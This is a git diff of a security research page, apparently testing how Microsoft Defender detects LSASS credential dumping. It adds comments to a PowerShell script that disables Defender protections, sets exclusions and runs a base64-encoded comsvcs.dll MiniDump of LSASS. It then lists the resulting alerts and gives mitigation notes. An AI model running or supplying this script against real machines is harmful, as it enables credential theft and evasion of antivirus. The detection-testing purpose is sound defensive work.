@@ -13,17 +13,19 @@ cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, Mi
 ```
 
 **Attack Script**
-- [x] Download a script ↓
+- [x] Download [a script](https://github.com/LearningKijo/ResearchDev/blob/main/DEV/DEV04-LSASSdumping-MiniDump/Dev04Ninja.ps1) ↓
 
 ```powershell
+// disable Microsoft Defender Antivrus tool
 Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath "C:\" -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true -ExclusionExtension "exe"
-    
-$tempDir = "C:\temp"
 
+// create "C:\temp" for a dump file
+$tempDir = "C:\temp"
 if (-not (Test-Path $tempDir -PathType Container)) {
         New-Item -Path $tempDir -ItemType Directory
 }
-    
+
+// LSASS dumping using the built-in Windows tool, Encoded by Base64
 powershell.exe -e JABsAHMAYQBzAHMAUABJAEQAIAA9ACAAKABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABsAHMAYQBzAHMAKQAuAEkAZAANAAoAYwBtAGQALgBlAHgAZQAgAC8AQwAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbwBtAHMAdgBjAHMALgBkAGwAbAAsACAATQBpAG4AaQBEAHUAbQBwACAAJABsAHMAYQBzAHMAUABJAEQAIABDADoAXAB0AGUAbQBwAFwAbwB1AHQALgBkAG0AcAAgAGYAdQBsAGwAIgA=
 ```
 > [!Note]
@@ -44,6 +46,8 @@ After running the script, these alerts were generated and correlated into a sing
 - [x] Suspicious Process Discovery
 - [x] Suspicious Microsoft Defender Antivirus exclusion
 - [x] Attempt to turn off Microsoft Defender Antivirus protection
+
+![image](https://github.com/LearningKijo/ResearchDev/assets/120234772/c3c23a51-799e-434b-b914-c48acbc2bee7)
 
 ## Blue Note
 - Turn on [Microsoft Defender Antvirus](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/next-generation-protection?view=o365-worldwide) (Including Real-Time Protection, Cloud Protection, Sample Submission and so on)
